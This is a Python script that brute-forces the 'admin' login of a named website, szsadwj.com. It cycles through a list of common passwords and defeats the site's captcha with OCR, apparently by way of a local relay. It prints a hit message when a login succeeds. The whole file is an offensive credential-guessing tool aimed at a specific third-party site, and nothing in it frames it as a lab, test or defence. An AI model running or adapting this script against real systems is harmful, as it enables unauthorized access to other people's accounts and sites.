#!/usr/bin/env python3
"""szsadwj_bf.py - szsadwj.com完整爆破 (BMP验证码OCR via 81.70)
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
GETCAP = 'http://127.0.0.1:13080/getcap_sz.php'
CAPIMG = 'http://127.0.0.1:13080/sz_cap.jpg'
LOGIN = 'http://127.0.0.1:13080/login_sz.php'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "szsadwj", "szsadwj123", "sadwj", "123456789"]

def fetch(url, timeout=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(40000)
    except Exception:
        return b''

def get_cap():
    out = fetch(GETCAP + '?d=szsadwj.com')
    if b'SAVED:' not in out:
        return None
    try:
        r = urllib.request.urlopen(urllib.request.Request(CAPIMG, headers=UA), timeout=15, context=ctx)
        return r.read()
    except Exception:
        return None

def do_login(pw, code):
    out = fetch(LOGIN + '?d=szsadwj.com&u=admin&p=' + urllib.parse.quote(pw) + '&c=' + code)
    idx = out.find(b'GIF89a')
    body = out[idx+6:] if idx > 0 else out
    try:
        text = body.decode('gb2312', 'ignore')
    except Exception:
        text = ''
    return text

def main():
    ocr = ddddocr.DdddOcr(show_ad=False)
    ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)
    for pw in PASSWORDS:
        for attempt in range(8):
            img = get_cap()
            if not img or len(img) < 50:
                print('cap fail %s' % pw, flush=True)
                time.sleep(3)
                continue
            try:
                c1 = ocr.classification(img)
                im = Image.open(io.BytesIO(img)).convert('L')
                im = im.resize((im.width * 6, im.height * 6), Image.LANCZOS)
                im = im.point(lambda p: 255 if p > 120 else 0)
                buf = io.BytesIO(); im.save(buf, 'PNG')
                c2 = ocrb.classification(buf.getvalue())
            except Exception as e:
                print('ocr err %s: %s' % (pw, repr(e)[:60]), flush=True)
                break
            code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
            text = do_login(pw, code)
            if '确认码' in text or '不一致' in text:
                continue  # 验证码错
            if '错误' in text or '失败' in text or '密码' in text or '不存在' in text:
                print('pw-wrong %s (cap=%s)' % (pw, code), flush=True)
                time.sleep(1.5)
                break
            if '管理' in text or '欢迎' in text or 'logout' in text.lower() or '成功' in text:
                print('!!! HIT: admin/%s cap=%s' % (pw, code), flush=True)
                print('  resp: %s' % text[:200].replace(chr(10), ' '), flush=True)
                sys.exit(0)
            print('CHECK %s: %s' % (pw, text[:80].replace(chr(10), ' ')), flush=True)
            time.sleep(1.5)
            break
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
